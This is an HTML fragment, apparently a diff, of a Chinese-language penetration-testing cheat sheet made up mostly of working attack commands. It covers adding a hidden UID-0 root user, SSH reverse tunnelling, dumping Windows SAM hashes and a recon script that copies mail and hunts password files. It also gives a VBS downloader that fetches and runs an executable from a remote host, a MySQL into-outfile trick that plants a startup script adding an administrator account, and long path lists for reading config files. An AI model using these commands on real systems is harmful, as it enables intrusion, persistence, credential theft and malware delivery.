+<P>nc -vv baidu.com 80 <br />
+GET HTTP://www.sina.com / HTTP/1.0 <br />
+GET HTTP://WWW.sina.com:22 / HTTP/1.0</P></TD></TR></TBODY></TABLE></P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">liunx 相关提权渗透技巧总结，五、SSH端口转发：</FONT></P>
+<P>ssh -C -f -N -g -R 44:127.0.0.1:22 cnbird@ip</P></TD></TR></TBODY></TABLE>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">liunx 相关提权渗透技巧总结，六、joomla渗透小技巧：</FONT></P>
+<P>确定版本：</P>
+<P>index.php?option=com_content&amp;view=article&amp;id=30:what-languages-are-supported-by-joomla-15&amp;catid=32:languages&amp;Itemid=47</P>
+<P>重新设置密码：</P>
+<P>index.php?option=com_user&amp;view=reset&amp;layout=confirm</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">liunx 相关提权渗透技巧总结，七、Linux添加UID为0的root用户：</FONT></P>
+<P>useradd -o -u 0 nothack</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">liunx 相关提权渗透技巧总结，八、freebsd本地提权：</FONT></P>
+<P>[argp@julius ~]$ uname -rsi <br />
+* freebsd 7.3-RELEASE GENERIC <br />
+* [argp@julius ~]$ sysctl vfs.usermount <br />
+* vfs.usermount: 1 <br />
+* [argp@julius ~]$ id <br />
+* uid=1001(argp) gid=1001(argp) groups=1001(argp) <br />
+* [argp@julius ~]$ gcc -Wall nfs_mount_ex.c -o nfs_mount_ex <br />
+* [argp@julius ~]$ ./nfs_mount_ex <br />
+* <br />
+calling nmount()</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">tar 文件夹打包：</FONT></P>
+<P>1、tar打包：</P>
+<P>tar -cvf /home/public_html/*.tar /home/public_html/--exclude=排除文件*.gif&nbsp;&nbsp;排除目录 /xx/xx/* <br />
+alzip打包(韩国) alzip -a D:\WEB\ d:\web\*.rar <br />
+{ <br />
+注： <br />
+关于tar的打包方式,linux不以扩展名来决定文件类型。 <br />
+若压缩的话tar -ztf *.tar.gz&nbsp;&nbsp; 查看压缩包里内容&nbsp;&nbsp;&nbsp;&nbsp; tar -zxf *.tar.gz 解压 <br />
+那么用这条比较好 tar -czf /home/public_html/*.tar.gz /home/public_html/--exclude= 排除文件*.gif&nbsp;&nbsp; 排除目录 /xx/xx/* <br />
+}&nbsp; </P>
+<P>提权先执行systeminfo <br />
+token 漏洞补丁号 KB956572 <br />
+Churrasco&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kb952004 <br />
+命令行RAR打包~~· <br />
+rar a -k -r -s -m3 c:\1.rar c:\folder</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">收集系统信息的脚本：</FONT></P>
+<P>for window：</P>
+<P>@echo off <br />
+echo #########system info collection <br />
+systeminfo <br />
+ver <br />
+hostname <br />
+net user <br />
+net localgroup <br />
+net localgroup administrators <br />
+net user guest <br />
+net user administrator</P>
+<P>echo #######at- with&nbsp;&nbsp; atq##### <br />
+echo schtask /query</P>
+<P>echo <br />
+echo ####task-list############# <br />
+tasklist /svc <br />
+echo <br />
+echo ####net-work infomation <br />
+ipconfig/all <br />
+route print <br />
+arp -a <br />
+netstat -anipconfig /displaydns <br />
+echo <br />
+echo #######service############ <br />
+sc query type= service state= all <br />
+echo #######file-############## <br />
+cd \ <br />
+tree -F <br />
+for linux：</P>
+<P>#!/bin/bash</P>
+<P>echo #######geting sysinfo#### <br />
+echo ######usage: ./getinfo.sh &gt;/tmp/sysinfo.txt <br />
+echo #######basic infomation## <br />
+cat /proc/meminfo <br />
+echo <br />
+cat /proc/cpuinfo <br />
+echo <br />
+rpm -qa 2&gt;/dev/null <br />
+######stole the mail......###### <br />
+cp -a /var/mail /tmp/getmail 2&gt;/dev/null</P>
+<P> <br />
+echo 'u'r id is' `id` <br />
+echo ###atq&amp;crontab##### <br />
+atq <br />
+crontab -l <br />
+echo #####about var##### <br />
+set</P>
+<P>echo #####about network### <br />
+####this is then point in pentest,but i am a new bird,so u need to add some in it <br />
+cat /etc/hosts <br />
+hostname <br />
+ipconfig -a <br />
+arp -v <br />
+echo ########user#### <br />
+cat /etc/passwd|grep -i sh</P>
+<P>echo ######service#### <br />
+chkconfig --list</P>
+<P>for i in {oracle,mysql,tomcat,samba,apache,ftp} <br />
+cat /etc/passwd|grep -i $i <br />
+done</P>
+<P>locate passwd &gt;/tmp/password 2&gt;/dev/null <br />
+sleep 5 <br />
+locate password &gt;&gt;/tmp/password 2&gt;/dev/null <br />
+sleep 5 <br />
+locate conf &gt;/tmp/sysconfig 2&gt;dev/null <br />
+sleep 5 <br />
+locate config &gt;&gt;/tmp/sysconfig 2&gt;/dev/null <br />
+sleep 5</P>
+<P>###maybe can use "tree /"### <br />
+echo ##packing up######### <br />
+tar cvf getsysinfo.tar /tmp/getmail /tmp/password /tmp/sysconfig <br />
+rm -rf /tmp/getmail /tmp/password /tmp/sysconfig</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">ethash 不免杀怎么获取本机 hash：</FONT></P>
+<P>首先导出注册表：</P>
+<P>Windows 2000：regedit /e d:\aa.reg "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users"</P>
+<P>Windows 2003：reg export "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users" d:\aa.reg</P>
+<P>&nbsp;&nbsp;&nbsp; 注意权限问题，一般注册表默认sam目录是不能访问的。需要设置为完全控制以后才可以访问（界面登录的需要注意，system权限可以忽略）。</P>
+<P>&nbsp;&nbsp;&nbsp; 接下来就简单了，把导出的注册表，down 到本机，修改注册表头导入本机，然后用抓去hash的工具抓本地用户就OK了 <br />
+hash 抓完了记得把自己的账户密码改过来哦！&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; 当 GetHashes 获取不到 hash 时，可以用冰刃把 sam 复制到桌面。据我所知，某人是用这个方法虚拟机多次因为不知道密码而进不去！~</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">vbs 下载者：</FONT></P>
+<P>1： <br />
+echo Set sGet = createObject("ADODB.Stream") &gt;&gt;c:\windows\cftmon.vbs <br />
+echo sGet.Mode = 3 &gt;&gt;c:\windows\cftmon.vbs <br />
+echo sGet.Type = 1 &gt;&gt;c:\windows\cftmon.vbs <br />
+echo sGet.Open() &gt;&gt;c:\windows\cftmon.vbs <br />
+echo sGet.Write(xPost.responseBody) &gt;&gt;c:\windows\cftmon.vbs <br />
+echo sGet.SaveToFile "c:\windows\e.exe",2 &gt;&gt;c:\windows\cftmon.vbs <br />
+echo Set objShell = CreateObject("Wscript.Shell") &gt;&gt;c:\windows\cftmon.vbs <br />
+echo objshell.run """c:\windows\e.exe""" &gt;&gt;c:\windows\cftmon.vbs <br />
+cftmon.vbs</P>
+<P>2： <br />
+On Error Resume Next:Dim iRemote,iLocal,s1,s2 <br />
+iLocal = LCase(WScript.Arguments(1)):iRemote = LCase(WScript.Arguments(0))&nbsp;  <br />
+s1="Mi"+"cro"+"soft"+"."+"XML"+"HTTP":s2="ADO"+"DB"+"."+"Stream" <br />
+Set xPost = CreateObject(s1):xPost.Open "GET",iRemote,0:xPost.Send() <br />
+Set sGet = CreateObject(s2):sGet.Mode=3:sGet.Type=1:sGet.Open() <br />
+sGet.Write(xPost.responseBody):sGet.SaveToFile iLocal,2</P>
+<P>cscript c:\down.vbs http://xxxx/mm.exe c:\mm.exe</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">create table a (cmd text)：</FONT></P>
+<P>insert into a values ("set wshshell=createobject (""wscript.shell"")"); <br />
+insert into a values ("a=wshshell.run (""cmd.exe /c net user admin admin /add"",0)"); <br />
+insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup administrators admin /add"",0)");&nbsp;  <br />
+select * from a into outfile "C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs";</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">Cmd 下目录的操作技巧：</FONT></P>
+<P>列出d的所有目录： <br />
+for /d %i in (d:\freehost\*) do @echo %i</P>
+<P>把当前路径下文件夹的名字只有1-3个字母的显示出来： <br />
+for /d %i in (???) do @echo %i</P>
+<P>以当前目录为搜索路径，把当前目录与下面的子目录的全部EXE文件列出： <br />
+for /r %i in (*.exe) do @echo %i</P>
+<P>以指定目录为搜索路径，把当前目录与下面的子目录的所有文件列出： <br />
+for /r "f:\freehost\hmadesign\web\" %i in (*.*) do @echo %i</P>
+<P>这个会显示a.txt里面的内容，因为/f的作用，会读出a.txt中： <br />
+for /f %i in (c:\1.txt) do echo %i  <br />
+&nbsp;  <br />
+delims=后的空格是分隔符，tokens是取第几个位置： <br />
+for /f "tokens=2 delims= " %i in (a.txt) do echo %i</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">Linux 系统下的一些常见路径：</FONT></P>
+<P>/etc/passwd <br />
+/etc/shadow <br />
+/etc/fstab <br />
+/etc/host.conf <br />
+/etc/motd <br />
+/etc/ld.so.conf <br />
+/var/www/htdocs/index.php <br />
+/var/www/conf/httpd.conf <br />
+/var/www/htdocs/index.html <br />
+/var/httpd/conf/php.ini <br />
+/var/httpd/htdocs/index.php <br />
+/var/httpd/conf/httpd.conf <br />
+/var/httpd/htdocs/index.html <br />
+/var/httpd/conf/php.ini <br />
+/var/www/index.html <br />
+/var/www/index.php <br />
+/opt/www/conf/httpd.conf <br />
+/opt/www/htdocs/index.php <br />
+/opt/www/htdocs/index.html <br />
+/usr/local/apache/htdocs/index.html <br />
+/usr/local/apache/htdocs/index.php <br />
+/usr/local/apache2/htdocs/index.html <br />
+/usr/local/apache2/htdocs/index.php <br />
+/usr/local/httpd2.2/htdocs/index.php <br />
+/usr/local/httpd2.2/htdocs/index.html <br />
+/tmp/apache/htdocs/index.html <br />
+/tmp/apache/htdocs/index.php <br />
+/etc/httpd/htdocs/index.php <br />
+/etc/httpd/conf/httpd.conf <br />
+/etc/httpd/htdocs/index.html <br />
+/www/php/php.ini <br />
+/www/php4/php.ini <br />
+/www/php5/php.ini <br />
+/www/conf/httpd.conf <br />
+/www/htdocs/index.php <br />
+/www/htdocs/index.html <br />
+/usr/local/httpd/conf/httpd.conf <br />
+/apache/apache/conf/httpd.conf <br />
+/apache/apache2/conf/httpd.conf <br />
+/etc/apache/apache.conf <br />
+/etc/apache2/apache.conf <br />
+/etc/apache/httpd.conf <br />
+/etc/apache2/httpd.conf <br />
+/etc/apache2/vhosts.d/00_default_vhost.conf <br />
+/etc/apache2/sites-available/default <br />
+/etc/phpmyadmin/config.inc.php <br />
+/etc/mysql/my.cnf <br />
+/etc/httpd/conf.d/php.conf <br />
+/etc/httpd/conf.d/httpd.conf <br />
+/etc/httpd/logs/error_log <br />
+/etc/httpd/logs/error.log <br />
+/etc/httpd/logs/access_log <br />
+/etc/httpd/logs/access.log <br />
+/home/apache/conf/httpd.conf <br />
+/home/apache2/conf/httpd.conf <br />
+/var/log/apache/error_log <br />
+/var/log/apache/error.log <br />
+/var/log/apache/access_log <br />
+/var/log/apache/access.log <br />
+/var/log/apache2/error_log <br />
+/var/log/apache2/error.log <br />
+/var/log/apache2/access_log <br />
+/var/log/apache2/access.log <br />
+/var/www/logs/error_log <br />
+/var/www/logs/error.log <br />
+/var/www/logs/access_log <br />
+/var/www/logs/access.log <br />
+/usr/local/apache/logs/error_log <br />
+/usr/local/apache/logs/error.log <br />
+/usr/local/apache/logs/access_log <br />
+/usr/local/apache/logs/access.log <br />
+/var/log/error_log <br />
+/var/log/error.log <br />
+/var/log/access_log <br />
+/var/log/access.log <br />
+/usr/local/apache/logs/access_logaccess_log.old <br />
+/usr/local/apache/logs/error_logerror_log.old <br />
+/etc/php.ini <br />
+/bin/php.ini <br />
+/etc/init.d/httpd <br />
+/etc/init.d/mysql <br />
+/etc/httpd/php.ini <br />
+/usr/lib/php.ini <br />
+/usr/lib/php/php.ini <br />
+/usr/local/etc/php.ini <br />
+/usr/local/lib/php.ini <br />
+/usr/local/php/lib/php.ini <br />
+/usr/local/php4/lib/php.ini <br />
+/usr/local/php4/php.ini <br />
+/usr/local/php4/lib/php.ini <br />
+/usr/local/php5/lib/php.ini <br />
+/usr/local/php5/etc/php.ini <br />
+/usr/local/php5/php5.ini <br />
+/usr/local/apache/conf/php.ini <br />
+/usr/local/apache/conf/httpd.conf <br />
+/usr/local/apache2/conf/httpd.conf <br />
+/usr/local/apache2/conf/php.ini <br />
+/etc/php4.4/fcgi/php.ini <br />
+/etc/php4/apache/php.ini <br />
+/etc/php4/apache2/php.ini <br />
+/etc/php5/apache/php.ini <br />
+/etc/php5/apache2/php.ini <br />
+/etc/php/php.ini <br />
+/etc/php/php4/php.ini <br />
+/etc/php/apache/php.ini <br />
+/etc/php/apache2/php.ini <br />
+/web/conf/php.ini <br />
+/usr/local/Zend/etc/php.ini <br />
+/opt/xampp/etc/php.ini <br />
+/var/local/www/conf/php.ini <br />
+/var/local/www/conf/httpd.conf <br />
+/etc/php/cgi/php.ini <br />
+/etc/php4/cgi/php.ini <br />
+/etc/php5/cgi/php.ini <br />
+/php5/php.ini <br />
+/php4/php.ini <br />
+/php/php.ini <br />
+/PHP/php.ini <br />
+/apache/php/php.ini <br />
+/xampp/apache/bin/php.ini <br />
+/xampp/apache/conf/httpd.conf <br />
+/NetServer/bin/stable/apache/php.ini <br />
+/home2/bin/stable/apache/php.ini <br />
+/home/bin/stable/apache/php.ini <br />
+/var/log/mysql/mysql-bin.log <br />
+/var/log/mysql.log <br />
+/var/log/mysqlderror.log <br />
+/var/log/mysql/mysql.log <br />
+/var/log/mysql/mysql-slow.log <br />
+/var/mysql.log <br />
+/var/lib/mysql/my.cnf <br />
+/usr/local/mysql/my.cnf <br />
+/usr/local/mysql/bin/mysql <br />
+/etc/mysql/my.cnf <br />
+/etc/my.cnf <br />
+/usr/local/cpanel/logs <br />
+/usr/local/cpanel/logs/stats_log <br />
+/usr/local/cpanel/logs/access_log <br />
+/usr/local/cpanel/logs/error_log <br />
+/usr/local/cpanel/logs/license_log <br />
+/usr/local/cpanel/logs/login_log <br />
+/usr/local/cpanel/logs/stats_log <br />
+/usr/local/share/examples/php4/php.ini <br />
+/usr/local/share/examples/php/php.ini <br />
+/usr/local/tomcat5527/bin/version.sh <br />
+/usr/share/tomcat6/bin/startup.sh <br />
+/usr/tomcat6/bin/startup.sh</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">Windows 系统下的一些常见路径（可以将c盘换成d,e盘,比如星外虚拟主机跟华众得,一般都放在d盘）：</FONT></P>
+<P>c:\windows\php.ini <br />
+c:\boot.ini <br />
+c:\1.txt <br />
+c:\a.txt</P>
+<P>c:\CMailServer\config.ini <br />
+c:\CMailServer\CMailServer.exe <br />
+c:\CMailServer\WebMail\index.asp <br />
+c:\program files\CMailServer\CMailServer.exe <br />
+c:\program files\CMailServer\WebMail\index.asp <br />
+C:\WinWebMail\SysInfo.ini <br />
+C:\WinWebMail\Web\default.asp <br />
+C:\WINDOWS\FreeHost32.dll <br />
+C:\WINDOWS\7i24iislog4.exe <br />
+C:\WINDOWS\7i24tool.exe</P>
+<P>c:\hzhost\databases\url.asp</P>
+<P>c:\hzhost\hzclient.exe <br />
+C:\Documents and Settings\All Users\「开始」菜单\程序\7i24虚拟主机管理平台\自动设置[受控端].lnk</P>
+<P>C:\Documents and Settings\All Users\「开始」菜单\程序\Serv-U\Serv-U Administrator.lnk <br />
+C:\WINDOWS\web.config <br />
+c:\web\index.html <br />
+c:\www\index.html <br />
+c:\WWWROOT\index.html <br />
+c:\website\index.html <br />
+c:\web\index.asp <br />
+c:\www\index.asp <br />
+c:\wwwsite\index.asp <br />
+c:\WWWROOT\index.asp <br />
+c:\web\index.php <br />
+c:\www\index.php <br />
+c:\WWWROOT\index.php <br />
+c:\WWWsite\index.php <br />
+c:\web\default.html <br />
+c:\www\default.html <br />
+c:\WWWROOT\default.html <br />
+c:\website\default.html <br />
+c:\web\default.asp <br />
+c:\www\default.asp <br />
+c:\wwwsite\default.asp <br />
+c:\WWWROOT\default.asp <br />
+c:\web\default.php <br />
+c:\www\default.php <br />
+c:\WWWROOT\default.php <br />
+c:\WWWsite\default.php <br />
+C:\Inetpub\wwwroot\pagerror.gif <br />
+c:\windows\notepad.exe <br />
+c:\winnt\notepad.exe <br />
+C:\Program Files\Microsoft Office\OFFICE10\winword.exe <br />
+C:\Program Files\Microsoft Office\OFFICE11\winword.exe <br />
+C:\Program Files\Microsoft Office\OFFICE12\winword.exe <br />
+C:\Program Files\Internet Explorer\IEXPLORE.EXE <br />
+C:\Program Files\winrar\rar.exe <br />
+C:\Program Files\360\360Safe\360safe.exe <br />
+C:\Program Files\360Safe\360safe.exe <br />
+C:\Documents and Settings\Administrator\Application Data\360Safe\360Examine\360Examine.log <br />
+c:\ravbin\store.ini <br />
+c:\rising.ini <br />
+C:\Program Files\Rising\Rav\RsTask.xml <br />
+C:\Documents and Settings\All Users\Start Menu\desktop.ini <br />
+C:\Documents and Settings\Administrator\My Documents\Default.rdp <br />
+C:\Documents and Settings\Administrator\Cookies\index.dat <br />
+C:\Documents and Settings\Administrator\My Documents\新建 文本文档.txt <br />
+C:\Documents and Settings\Administrator\桌面\新建 文本文档.txt <br />
+C:\Documents and Settings\Administrator\My Documents\1.txt <br />
+C:\Documents and Settings\Administrator\桌面\1.txt <br />
+C:\Documents and Settings\Administrator\My Documents\a.txt <br />
+C:\Documents and Settings\Administrator\桌面\a.txt <br />
+C:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Blue hills.jpg <br />
+E:\Inetpub\wwwroot\aspnet_client\system_web\1_1_4322\SmartNav.htm <br />
+C:\Program Files\RhinoSoft.com\Serv-U\Version.txt <br />
+C:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini <br />
+C:\Program Files\Symantec\SYMEVENT.INF <br />
+C:\Program Files\Microsoft SQL Server\80\Tools\Binn\sqlmangr.exe <br />
+C:\Program Files\Microsoft SQL Server\MSSQL\Data\master.mdf <br />
+C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\Data\master.mdf <br />
+C:\Program Files\Microsoft SQL Server\MSSQL.2\MSSQL\Data\master.mdf <br />
+C:\Program Files\Microsoft SQL Server\80\Tools\HTML\database.htm <br />
+C:\Program Files\Microsoft SQL Server\MSSQL\README.TXT <br />
+C:\Program Files\Microsoft SQL Server\90\Tools\Bin\DdsShapes.dll <br />
+C:\Program Files\Microsoft SQL Server\MSSQL\sqlsunin.ini <br />
+C:\MySQL\MySQL Server 5.0\my.ini <br />
+C:\Program Files\MySQL\MySQL Server 5.0\my.ini <br />
+C:\Program Files\MySQL\MySQL Server 5.0\data\mysql\user.frm <br />
+C:\Program Files\MySQL\MySQL Server 5.0\COPYING <br />
+C:\Program Files\MySQL\MySQL Server 5.0\share\mysql_fix_privilege_tables.sql <br />
+C:\Program Files\MySQL\MySQL Server 4.1\bin\mysql.exe <br />
+c:\MySQL\MySQL Server 4.1\bin\mysql.exe <br />
+c:\MySQL\MySQL Server 4.1\data\mysql\user.frm <br />
+C:\Program Files\Oracle\oraconfig\Lpk.dll <br />
+C:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\aspnet_state.exe <br />
+C:\WINDOWS\system32\inetsrv\w3wp.exe <br />
+C:\WINDOWS\system32\inetsrv\inetinfo.exe <br />
+C:\WINDOWS\system32\inetsrv\MetaBase.xml <br />
+C:\WINDOWS\system32\inetsrv\iisa, dmpwd\achg.asp <br />
+C:\WINDOWS\system32\config\default.LOG <br />
+C:\WINDOWS\system32\config\sam <br />
+C:\WINDOWS\system32\config\system <br />
+c:\CMailServer\config.ini <br />
+c:\program files\CMailServer\config.ini <br />
+c:\tomcat6\tomcat6\bin\version.sh <br />
+c:\tomcat6\bin\version.sh <br />
+c:\tomcat\bin\version.sh <br />
+c:\program files\tomcat6\bin\version.sh <br />
+C:\Program Files\Apache Software Foundation\Tomcat 6.0\bin\version.sh <br />
+c:\Program Files\Apache Software Foundation\Tomcat 6.0\logs\isapi_redirect.log <br />
+c:\Apache2\Apache2\bin\Apache.exe <br />
+c:\Apache2\bin\Apache.exe <br />
+c:\Apache2\php\license.txt <br />
+C:\Program Files\Apache Group\Apache2\bin\Apache.exe <br />
+c:\Program Files\QQ2007\qq.exe <br />
+c:\Program Files\Tencent\, qq\User.db <br />
+c:\Program Files\Tencent\qq\qq.exe <br />
+c:\Program Files\Tencent\qq\bin\qq.exe <br />
+c:\Program Files\Tencent\qq2009\qq.exe <br />
+c:\Program Files\Tencent\qq2008\qq.exe <br />
+c:\Program Files\Tencent\qq2010\bin\qq.exe <br />
+c:\Program Files\Tencent\qq\Users\All Users\Registry.db <br />
+C:\Program Files\Tencent\TM\TMDlls\QQZip.dll <br />
+c:\Program Files\Tencent\Tm\Bin\Txplatform.exe <br />
+c:\Program Files\Tencent\RTXServer\AppConfig.xml <br />
+C:\Program Files\Foxmal\Foxmail.exe <br />
+C:\Program Files\Foxmal\accounts.cfg <br />
+C:\Program Files\tencent\Foxmal\Foxmail.exe <br />
+C:\Program Files\tencent\Foxmal\accounts.cfg <br />
+C:\Program Files\LeapFTP 3.0\LeapFTP.exe <br />
+C:\Program Files\LeapFTP\LeapFTP.exe <br />
+c:\Program Files\GlobalSCAPE\CuteFTP Pro\cftppro.exe <br />
+c:\Program Files\GlobalSCAPE\CuteFTP Pro\notes.txt <br />
+C:\Program Files\FlashFXP\FlashFXP.ini <br />
+C:\Program Files\FlashFXP\flashfxp.exe <br />
+c:\Program Files\Oracle\bin\regsvr32.exe <br />
+c:\Program Files\腾讯游戏\QQGAME\readme.txt <br />
+c:\Program Files\tencent\腾讯游戏\QQGAME\readme.txt <br />
+c:\Program Files\tencent\QQGAME\readme.txt <br />
+C:\Program Files\StormII\Storm.exe</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">各种网站的配置文件相对路径大全：</FONT></P>
+<P>/config.php <br />
+../../config.php <br />
+../config.php <br />
+../../../config.php <br />
+/config.inc.php <br />
+./config.inc.php <br />
+../../config.inc.php <br />
+../config.inc.php <br />
+../../../config.inc.php <br />
+/conn.php <br />
+./conn.php <br />
+../../conn.php <br />
+../conn.php <br />
+../../../conn.php <br />
+/conn.asp <br />
+./conn.asp <br />
+../../conn.asp <br />
+../conn.asp <br />
+../../../conn.asp <br />
+/config.inc.php <br />
+./config.inc.php <br />
+../../config.inc.php <br />
+../config.inc.php <br />
+../../../config.inc.php <br />
+/config/config.php <br />
+../../config/config.php <br />
+../config/config.php <br />
+../../../config/config.php <br />
+/config/config.inc.php <br />
+./config/config.inc.php <br />
+../../config/config.inc.php <br />
+../config/config.inc.php <br />
+../../../config/config.inc.php <br />
+/config/conn.php <br />
+./config/conn.php <br />
+../../config/conn.php <br />
+../config/conn.php <br />
+../../../config/conn.php <br />
+/config/conn.asp <br />
+./config/conn.asp <br />
+../../config/conn.asp <br />
+../config/conn.asp <br />
+../../../config/conn.asp <br />
+/config/config.inc.php <br />
+./config/config.inc.php <br />
+../../config/config.inc.php <br />
+../config/config.inc.php <br />
+../../../config/config.inc.php <br />
+/data/config.php <br />
+../../data/config.php <br />
+../data/config.php <br />
+../../../data/config.php <br />
+/data/config.inc.php <br />
+./data/config.inc.php <br />
+../../data/config.inc.php <br />
+../data/config.inc.php <br />
+../../../data/config.inc.php <br />
+/data/conn.php <br />
+./data/conn.php <br />
+../../data/conn.php <br />
+../data/conn.php <br />
+../../../data/conn.php <br />
+/data/conn.asp <br />
+./data/conn.asp <br />
+../../data/conn.asp <br />
+../data/conn.asp <br />
+../../../data/conn.asp <br />
+/data/config.inc.php <br />
+./data/config.inc.php <br />
+../../data/config.inc.php <br />
+../data/config.inc.php <br />
+../../../data/config.inc.php <br />
+/include/config.php <br />
+../../include/config.php <br />
+../include/config.php <br />
+../../../include/config.php <br />
+/include/config.inc.php <br />
+./include/config.inc.php <br />
+../../include/config.inc.php <br />
+../include/config.inc.php <br />
+../../../include/config.inc.php <br />
+/include/conn.php <br />
+./include/conn.php <br />
+../../include/conn.php <br />
+../include/conn.php <br />
+../../../include/conn.php <br />
